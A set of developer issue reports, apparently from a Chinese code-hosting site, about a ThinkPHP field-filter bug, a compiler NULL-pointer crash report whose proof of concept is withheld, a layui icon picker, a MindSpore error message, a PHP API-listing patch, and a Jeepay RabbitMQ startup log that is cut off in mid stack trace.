Db update 时，field不能过滤无效字段,"在 Db::name('think')-&gt;field('name,age')-&gt;update( [ 10几项值 ] ) 时，TP5的field是可以过滤的，6里面update不生效，insert是有用的。 非常奇怪，是故意这样做的吗？用了6还得自己过滤一遍。 我的过滤代码   <code>: $only_data = $data; if ( $field ){ $only_data = []; $only_field = is_array( $field ) ?: explode(',', $field); foreach ( $only_field as $v ){ $v = py_trim($v); if ( $data[$v] !== NULL ){ $only_data[$v] = py_trim($data[$v]); } } }"
mplcg has a NULL pointer dereference security issue in the funciton maplebe::EHFunc::CreateTypeInfoSt(),"Issue Description There is a NULL pointer in the function maplebe::EHFunc::CreateTypeInfoSt() When I excute my sample,the crash will be triggered. Issue analyzation When I excute my sample,the NULL pointer dereference will appear at the address . It's just like this. Version Current version,the last commit is https://gitee.com/harmonyos/OpenArkCompiler/commit/f32c7477d13f69d71293ced1da7d247ab2b25a12 POC The POC link is Attachment.The POC file is encrypted.Please concat me to get the POC password. CREDIT By HP0-Lab wind.   <code>: 0x58e9b5 0x58e9b5 &lt;_ZN7maplebe6EHFunc16CreateTypeInfoStEv+85&gt;: mov 0x80(%rdi),%rax"
关于图标选择器，如何选择空值。2.7RC5,"使用2.7RC5 JS代码如下 HTML代码 菜单新增图标，点击后选择一个就行了。 问题来了，如果我想去掉图标，无法在选择器里选择“空值”。   <code>: icon.render({ elem: '#iconPicker' ,style: 'color: #5FB878;' ,placeholder: '' ,isSplit: true ,page: false ,search: false ,click: function(obj){ console.log(obj) } ,ready: function(){ console.log(1) } }); &lt;input type=""text"" name=""Me_Icon"" id=""iconPicker"" value="""" lay-filter=""iconPicker"" class=""hide""&gt;"
"[CT][MS][histogramfixedwidth]histogramfixedwidth valueerror info missing "",""","histogramfixedwidth算子的报错信息缺少逗号 / 硬件环境: Please delete the backend not involved / 请删除不涉及的后端:ascend/GPU/CPU /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :master -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_histogramfixedwidth_exception_dtype_int16 pytest -s -v operations/test_histogramfixedwidth.py::test_histogramfixedwidth_exception_dtype_int16 case pass For 'HistogramFixedWidth'后缺少逗号   <code>: def test_histogramfixedwidth_exception_dtype_int16(): fact = HistogramFixedWidthFactory(input_x=(8, 128, 32), input_v=(-88, 100), nbins=20, dtype=""int16"", dtype1=np.int64) #with pytest.raises((RuntimeError, TypeError, ValueError)) as err: &gt; fact.forward_mindspore_impl() operations/test_histogramfixedwidth.py:385: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ share/ops/primitive/histogramfixedwidth_ops.py:34: in forward_mindspore_impl net = HistogramFixedWidth(self.nbins, self.dtype) share/utils.py:128: in __init__ super().__init__(*args, **kwargs) share/ops/primitive/histogramfixedwidth_ops.py:15: in __init__ self.op = op.HistogramFixedWidth(nbins=nbins, dtype=dtype) /root/archiconda3/envs/zhanyang_op3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:684: in deco fn(self, *args, **kwargs) /root/archiconda3/envs/zhanyang_op3.7/lib/python3.7/site-packages/mindspore/ops/operations/math_ops.py:2370: in __init__ self.dtype = validator.check_string(dtype, valid_values, ""dtype"", self.name) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ arg_value = 'int16', valid_values = ['int32'], arg_name = 'dtype', prim_name = 'HistogramFixedWidth' @staticmethod def check_string(arg_value, valid_values, arg_name=None, prim_name=None): """""" Check whether string is in some value list. Usage: - method = check_string(method, [""string1"", ""string2"", ""string3""], ""method"") """""" if isinstance(arg_value, str) and arg_value in valid_values: return arg_value arg_name = arg_name if arg_name else ""parameter"" msg_prefix = f'For \'{prim_name}\' the' if prim_name else ""The"" &gt; raise ValueError(f""{msg_prefix} '{arg_name}' must be str and must be in '{valid_values}',"" f"" but got '{arg_value}'."") E ValueError: For 'HistogramFixedWidth' the 'dtype' must be str and must be in '['int32']', but got 'int16'. /root/archiconda3/envs/zhanyang_op3.7/lib/python3.7/site-packages/mindspore/_checkparam.py:439: ValueError"
listAllApis.php 显示内容未完善,"问题: 查看所有接口的链接(/Public/demo/listAllApis.php)显示如下： 接着去看 listAllApis.php 发现并没有实现更多说明。 解决方案： 以下是本人针对 listAllApis.php 改动的地方，希望有所帮助 ：)   <code>: foreach ($method as $mValue) { $rMethod = new Reflectionmethod($apiServer, $mValue); if (!$rMethod-&gt;isPublic()) { continue; } $title = '//请检测函数注释'; $docComment = $rMethod-&gt;getDocComment(); /* 改动1:去除接口注释中的desc部分 */ preg_match('/\@desc (.+)*/', $docComment, $matches); $desc = !empty($matches) &amp;&amp; isset($matches[1]) ? $matches[1] : """"; /* 改动1:end */ if ($docComment !== false) { $docCommentArr = explode(""\n"", $docComment); $comment = trim($docCommentArr[1]); $title = trim(substr($comment, strpos($comment, '*') + 1)); } $service = substr($apiServer, 4) . '.' . ucfirst($mValue); $allApiS[$service] = array( 'service' =&gt; $service, 'title' =&gt; $title, 'desc' =&gt; $desc, // 改动2:加入desc字段 ); } foreach ($allApiS as $key =&gt; $item) { $link = $uri . '?service=' . $item['service']; $NO = $num++; echo ""&lt;tr&gt;&lt;td&gt;{$NO}&lt;/td&gt;&lt;td&gt;&lt;a href=\""$link\"" target='_blank'&gt;{$item['service']}&lt;/a&gt;&lt;/td&gt;&lt;td&gt;{$item['title']}&lt;/td&gt;&lt;td&gt;{$item['desc']}&lt;/td&gt;&lt;/tr&gt;""; // 改动3:将desc在模板中显示 }"
换成rabbitmq启动失败,"就是启动找不到队列，队列不应该自己创建的吗？   <code>: Connected to the target VM, address: '127.0.0.1:63512', transport: 'socket' __ / /___ ___ ____ ____ ___ __ __ / // _ \/ _ \/ __ \/ __ `/ / / / / /_/ // __/ __/ /_/ / /_/ / /_/ / \____/ \___/\___/ .___/\__,_/\__, / /_/ /____/ :: Jeepay :: (v1.13.0.RELEASE) 适合互联网企业使用的开源支付系统 : https://www.jeequan.com 2022-07-07 18:18:41.518 INFO [main] [c.j.j.m.b.JeepayMgrApplication] - Starting JeepayMgrApplication using Java 1.8.0_131 on DESKTOP-HCBI604 with PID 24176 (D:\Project\jeepay\jeepay-manager\target\classes started by Administrator in D:\Project\jeepay) 2022-07-07 18:18:41.531 DEBUG [main] [c.j.j.m.b.JeepayMgrApplication] - Running with Spring Boot v2.4.8, Spring v5.3.8 2022-07-07 18:18:41.532 INFO [main] [c.j.j.m.b.JeepayMgrApplication] - No active profile set, falling back to default profiles: default 2022-07-07 18:18:42.533 INFO [main] [o.s.d.r.c.RepositoryConfigurationDelegate] - Multiple Spring Data modules found, entering strict repository configuration mode! 2022-07-07 18:18:42.535 INFO [main] [o.s.d.r.c.RepositoryConfigurationDelegate] - Bootstrapping Spring Data Redis repositories in DEFAULT mode. 2022-07-07 18:18:42.557 INFO [main] [o.s.d.r.c.RepositoryConfigurationDelegate] - Finished Spring Data repository scanning in 6 ms. Found 0 Redis repository interfaces. 2022-07-07 18:18:42.706 INFO [main] [o.s.c.a.ConfigurationClassPostProcessor] - Cannot enhance @Configuration bean definition 'rabbitMQBeanProcessor' since its singleton instance has been created too early. The typical cause is a non-static @Bean method with a BeanDefinitionRegistryPostProcessor return type: Consider declaring such methods as 'static'. 2022-07-07 18:18:43.088 INFO [main] [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler@1f43cab7' of type [org.springframework.security.access.expression.method.DefaultMethodSecurityExpressionHandler] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-07-07 18:18:43.095 INFO [main] [o.s.c.s.PostProcessorRegistrationDelegate$BeanPostProcessorChecker] - Bean 'methodSecurityMetadataSource' of type [org.springframework.security.access.method.DelegatingMethodSecurityMetadataSource] is not eligible for getting processed by all BeanPostProcessors (for example: not eligible for auto-proxying) 2022-07-07 18:18:43.392 INFO [main] [o.s.b.w.e.t.TomcatWebServer] - Tomcat initialized with port(s): 9217 (http) 2022-07-07 18:18:43.403 INFO [main] [o.a.c.h.Http11NioProtocol] - Initializing ProtocolHandler [""http-nio-9217""] 2022-07-07 18:18:43.403 INFO [main] [o.a.c.c.StandardService] - Starting service [Tomcat] 2022-07-07 18:18:43.403 INFO [main] [o.a.c.c.StandardEngine] - Starting Servlet engine: [Apache Tomcat/9.0.48] 2022-07-07 18:18:43.555 INFO [main] [o.a.c.c.C.[.[.[/]] - Initializing Spring embedded WebApplicationContext 2022-07-07 18:18:43.555 INFO [main] [o.s.b.w.s.c.ServletWebServerApplicationContext] - Root WebApplicationContext: initialization completed in 1966 ms 2022-07-07 18:18:43.725 INFO [main] [c.a.d.s.b.a.DruidDataSourceAutoConfigure] - Init DruidDataSource 2022-07-07 18:18:44.006 INFO [main] [c.a.d.p.DruidDataSource] - {dataSource-1} inited _ _ |_ _ _|_. ___ _ | _ | | |\/|_)(_| | |_\ |_)||_|_\ / | 3.4.2 2022-07-07 18:18:44.917 WARN [main] [c.b.m.c.m.TableInfoHelper] - Can not find table primary key in Class: ""com.jeequan.jeepay.core.entity.SysUserRoleRela"". 2022-07-07 18:18:45.245 WARN [main] [c.b.m.c.m.TableInfoHelper] - Can not find table primary key in Class: ""com.jeequan.jeepay.core.entity.SysRoleEntRela"". 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/*.html', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/favicon.ico', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.html', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.css', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.js', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.png', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.jpg', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.jpeg', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.svg', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.ico', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.webp', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/*.txt', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.xls', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/**/*.mp4', GET] with [] 2022-07-07 18:18:46.824 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure Ant [pattern='/api/anon/**'] with [] 2022-07-07 18:18:46.864 INFO [main] [o.s.s.w.DefaultSecurityFilterChain] - Will secure any request with [org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter@62f37bfd, org.springframework.security.web.context.SecurityContextPersistenceFilter@37fffef3, org.springframework.security.web.header.HeaderWriterFilter@7aa63f50, org.springframework.web.filter.CorsFilter@31f31b20, org.springframework.security.web.authentication.logout.LogoutFilter@1fcc3461, com.jeequan.jeepay.mgr.secruity.JeeAuthenticationTokenFilter@1818d00b, org.springframework.security.web.savedrequest.RequestCacheAwareFilter@66716959, org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter@705d914f, org.springframework.security.web.authentication.AnonymousAuthenticationFilter@b3a8455, org.springframework.security.web.session.SessionManagementFilter@6315bb4, org.springframework.security.web.access.ExceptionTranslationFilter@570299e3, org.springframework.security.web.access.intercept.FilterSecurityInterceptor@219edc05] 2022-07-07 18:18:47.099 INFO [main] [o.s.b.a.w.s.WelcomePageHandlerMapping] - Adding welcome page: class path resource [static/index.html] 2022-07-07 18:18:47.795 WARN [main] [o.s.b.a.f.FreeMarkerAutoConfiguration] - Cannot find template location(s): [classpath:/templates] (please add some templates, check your FreeMarker configuration, or set spring.freemarker.checkTemplateLocation=false) 2022-07-07 18:18:47.955 INFO [main] [o.a.c.h.Http11NioProtocol] - Starting ProtocolHandler [""http-nio-9217""] 2022-07-07 18:18:47.972 INFO [main] [o.s.b.w.e.t.TomcatWebServer] - Tomcat started on port(s): 9217 (http) with context path '' 2022-07-07 18:18:47.975 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:18:48.012 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:0/SimpleConnection@e0d9e3f [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63543] 2022-07-07 18:18:48.027 INFO [main] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:18:48.056 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:18:48.060 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:18:48.061 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:1/SimpleConnection@f472245 [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63544] 2022-07-07 18:18:49.075 INFO [main] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:18:49.080 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:18:49.080 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:18:49.086 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:2/SimpleConnection@281963c [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63547] 2022-07-07 18:18:51.097 INFO [main] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:18:51.099 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:18:51.101 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:18:51.105 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:3/SimpleConnection@7164e28a [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63552] 2022-07-07 18:18:55.112 INFO [main] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:18:55.114 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:18:55.115 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:18:55.120 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:4/SimpleConnection@2de07c57 [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63559] 2022-07-07 18:19:00.126 INFO [main] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:00.128 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:00.129 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:00.133 INFO [main] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:5/SimpleConnection@39fc17be [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63566] 2022-07-07 18:19:00.135 INFO [main] [o.s.a.r.l.SimpleMessageListenerContainer] - Broker not available; cannot force queue declarations during start: java.io.IOException 2022-07-07 18:19:00.145 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:00.146 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:00.147 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:00.151 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:6/SimpleConnection@67a8ca25 [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63567] 2022-07-07 18:19:00.151 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:00.155 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:00.156 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:00.160 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:7/SimpleConnection@2e5a00af [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63568] 2022-07-07 18:19:01.170 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:01.172 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:01.173 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:01.178 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:8/SimpleConnection@1bb9f633 [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63570] 2022-07-07 18:19:03.185 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:03.187 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:03.188 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:03.192 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:9/SimpleConnection@5bb0d86a [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63573] 2022-07-07 18:19:07.195 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:07.197 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:07.199 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:07.203 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:10/SimpleConnection@202e7c97 [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63583] 2022-07-07 18:19:12.204 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.RabbitAdmin] - Auto-declaring a non-durable, auto-delete, or exclusive Queue (spring.gen-WIFiNrd2RTantI20TMMXgQ) durable:false, auto-delete:true, exclusive:true. It will be redeclared if the broker stops and is restarted while the connection factory is alive, but all messages will be lost. 2022-07-07 18:19:12.207 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Attempting to connect to: [192.168.10.56:5672] 2022-07-07 18:19:12.209 WARN [AMQP Connection 192.168.10.56:5672] [c.r.c.i.ForgivingExceptionHandler] - An unexpected connection driver error occured (Exception message: Connection reset) 2022-07-07 18:19:12.214 INFO [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.c.CachingConnectionFactory] - Created new connection: rabbitConnectionFactory#717a8a76:11/SimpleConnection@5389e362 [delegate=amqp://jeepay@192.168.10.56:5672/jeepay_vh, localPort= 63590] 2022-07-07 18:19:12.220 ERROR [org.springframework.amqp.rabbit.RabbitListenerEndpointContainer#0-1] [o.s.a.r.l.SimpleMessageListenerContainer] - Failed to check/redeclare auto-delete queue(s). org.springframework.amqp.AmqpIOException: java.io.IOException at org.springframework.amqp.rabbit.support.RabbitExceptionTranslator.convertRabbitAccessException(RabbitExceptionTranslator.java:70) at org.springframework.amqp.rabbit.connection.RabbitAccessor.convertRabbitAccessException(RabbitAccessor.java:113) at org.springframework.amqp.rabbit.core.RabbitTemplate.doExecute(RabbitTemplate.java:2194) at org.springframework.amqp.rabbit.core.RabbitTemplate.execute(RabbitTemplate.java:2140) at org.springframework.amqp.rabbit.core.RabbitTemplate.execute(RabbitTemplate.java:2120) at org.springframework.amqp.rabbit.core.RabbitAdmin.initialize(RabbitAdmin.java:604) at org.springframework.amqp.rabbit.core.RabbitAdmin.lambda$null$10(RabbitAdmin.java:532) at org.springframework.retry.support.RetryTemplate.doExecute(RetryTemplate.java:329) at org.springframework.retry.support.RetryTemplate.execute(RetryTemplate.java:209) at org.springframework.amqp.rabbit.core.RabbitAdmin.lambda$afterPropertiesSet$11(RabbitAdmin.java:531) at org.springframework.amqp.rabbit.connection.CompositeConnectionListener.lambda$onCreate$0(CompositeConnectionListener.java:38) at java.util.concurrent.CopyOnWriteArrayList.forEach(CopyOnWriteArrayList.java:890) at org.springframework.amqp.rabbit.connection.CompositeConnectionListener.onCreate(CompositeConnectionListener.java:38) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory.createConnection(CachingConnectionFactory.java:730) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory.createBareChannel(CachingConnectionFactory.java:675) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory.access$700(CachingConnectionFactory.java:99) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory$CachedChannelInvocationHandler.invoke(CachingConnectionFactory.java:1178) at com.sun.proxy.$Proxy161.exchangeDeclare(Unknown Source) at org.springframework.amqp.rabbit.core.RabbitAdmin.declareExchanges(RabbitAdmin.java:688) at org.springframework.amqp.rabbit.core.RabbitAdmin.lambda$initialize$12(RabbitAdmin.java:605) at org.springframework.amqp.rabbit.core.RabbitTemplate.invokeAction(RabbitTemplate.java:2229) at org.springframework.amqp.rabbit.core.RabbitTemplate.doExecute(RabbitTemplate.java:2188) at org.springframework.amqp.rabbit.core.RabbitTemplate.execute(RabbitTemplate.java:2140) at org.springframework.amqp.rabbit.core.RabbitTemplate.execute(RabbitTemplate.java:2120) at org.springframework.amqp.rabbit.core.RabbitAdmin.initialize(RabbitAdmin.java:604) at org.springframework.amqp.rabbit.listener.AbstractMessageListenerContainer.attemptDeclarations(AbstractMessageListenerContainer.java:1916) at org.springframework.amqp.rabbit.listener.AbstractMessageListenerContainer.redeclareElementsIfNecessary(AbstractMessageListenerContainer.java:1893) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.initialize(SimpleMessageListenerContainer.java:1347) at org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer$AsyncMessageProcessingConsumer.run(SimpleMessageListenerContainer.java:1193) at java.lang.Thread.run(Thread.java:748) Caused by: java.io.IOException: null at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:129) at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:125) at com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:147) at com.rabbitmq.client.impl.ChannelN.exchangeDeclare(ChannelN.java:783) at com.rabbitmq.client.impl.ChannelN.exchangeDeclare(ChannelN.java:46) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.amqp.rabbit.connection.CachingConnectionFactory$CachedChannelInvocationHandler.invoke(CachingConnectionFactory.java:1157) at com.sun.proxy.$Proxy161.exchangeDeclare(Unknown Source) at org.springframework.amqp.rabbit.core.RabbitAdmin.declareExchanges(RabbitAdmin.java:688) at org.springframework.amqp.rabbit.core.RabbitAdmin.lambda$initialize$12(RabbitAdmin.java:605) at org.springframework.amqp.rabbit.core.RabbitTemplate.invokeAction(RabbitTemplate.java:2229) at org.springframework.amqp.rabbit.core.RabbitTemplate.doExecute(RabbitTemplate.java:2188) ... 27 common frames omitted Caused by: com.rabbitmq.client.ShutdownSignalException: connection error; protocol method: #method&lt;connection.close&gt;(reply-code=503, reply-text=COMMAND_INVALID - unknown exchange type 'x-delayed-message', class-id=40, method-id=10) at com.rabbitmq.utility.ValueOrException.getValue(ValueOrException.java:66) at com.rabbitmq.utility.BlockingValueOrException.uninterruptibleGetValue(BlockingValueOrException.java:36) at com.rabbitmq.client.impl.AMQChannel$BlockingRpcContinuation.getReply(AMQChannel.java:502) at com.rabbitmq.client.impl.AMQChannel.privateRpc(AMQChannel.java:293) at 